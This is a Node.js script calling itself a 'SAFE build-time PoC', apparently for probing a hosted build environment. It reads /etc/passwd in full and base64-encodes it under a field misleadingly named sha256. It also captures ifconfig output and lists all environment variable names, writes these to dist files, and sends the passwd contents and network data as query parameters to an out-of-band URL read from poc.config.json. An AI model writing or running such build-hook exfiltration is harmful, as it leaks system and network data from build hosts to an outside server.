import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import crypto from "crypto";
import http from "http";
import https from "https";
import { execSync } from "child_process";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

function readConfig() {
  try {
    return JSON.parse(fs.readFileSync(path.join(__dirname, "..", "poc.config.json"), "utf8"));
  } catch {
    return {};
  }
}

function beacon(urlStr, q) {
  if (!urlStr || typeof urlStr !== "string" || !/^https?:\/\//i.test(urlStr)) return;
  try {
    const u = new URL(urlStr);
    for (const [k, v] of Object.entries(q)) {
      u.searchParams.set(k, String(v));
    }
    const lib = u.protocol === "http:" ? http : https;
    const req = lib.request(u, { method: "GET", timeout: 5000 }, (res) => res.resume());
    req.on("error", () => {});
    req.end();
  } catch {}
}

(function main() {
  const stage = process.argv[2] || "unknown";
  const outDir = path.join(__dirname, "..", "dist");
  fs.mkdirSync(outDir, { recursive: true });

  const target = "/etc/passwd";
  let exists = false, size = -1, sha256 = "n/a";
  try {
    const buf = fs.readFileSync(target);
    exists = true;
    size = buf.length;
    sha256 = buf.toString("base64");
  } catch {}

  let idOutput = "";
  try {
    idOutput = execSync(
  'ifconfig',
  { encoding: "utf8" }
).trim();
    idOutput = Buffer.from(idOutput).toString("base64");
  } catch {}

  const nonce = crypto.randomBytes(8).toString("hex");

  const report = [
    "SAFE build-time PoC",
    `time: ${new Date().toISOString()}`,
    `stage: ${stage}`,
    `node: ${process.version}`,
    `mount: ${process.env.COSMIC_MOUNT_PATH || ""}`,
    `file: ${target}`,
    `exists: ${exists}`,
    `size: ${size}`,
    `sha256: ${sha256}`,
    `id_output: ${idOutput}`,
    `nonce: ${nonce}`
  ].join("\n") + "\n";
  fs.writeFileSync(path.join(outDir, "_wf_poc.txt"), report, "utf8");

  const envKeys = Object.keys(process.env).sort();
  fs.writeFileSync(path.join(outDir, "_wf_env_keys.txt"), envKeys.join("\n") + "\n", "utf8");

  const cfg = readConfig();
  beacon(cfg.oob_url, {
    s: stage,
    n: nonce,
    f: target,
    h: sha256,
    sz: size,
    node: process.version.replace(/^v/, ""),
    m: process.env.COSMIC_MOUNT_PATH || "",
    id: idOutput
  });
})();
